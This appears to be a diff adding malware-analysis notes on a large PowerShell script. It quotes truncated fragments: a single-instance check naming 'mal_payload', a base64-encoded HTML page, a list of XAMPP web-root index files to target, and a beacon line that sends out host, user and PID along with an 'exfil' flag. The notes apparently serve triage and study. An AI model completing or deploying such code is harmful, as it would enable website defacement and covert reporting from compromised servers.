@@ -1,0 +1,5 @@
+len: 235162
+HEAD 300: '$ProgressPreference="SilentlyContinue";$K=@($null,$null,$null,$null);if((Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $PID -and $_.CommandLine -match "mal_payload" }).Count -ge 1){exit}while($true){try{$ROOTDEF=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64S'
+rootdef-b64-head: 'PCFkb2N0eXBlIGh0bWw+PGh0bWw+PGhlYWQ+PG1ldG'
+FL: '$FL=@("c:/xampp/htdocs/index.php","c:/xampp/htdocs/index.html","c:/xampp/htdocs/home.php",'
+beac ctx: 'xt -Value ("alive|t="+$t+"|host="+$env:COMPUTERNAME+"|user="+$env:USERNAME+"|pid="+$PID+"|beac="+$n+"|exfil="+(Test-Path'
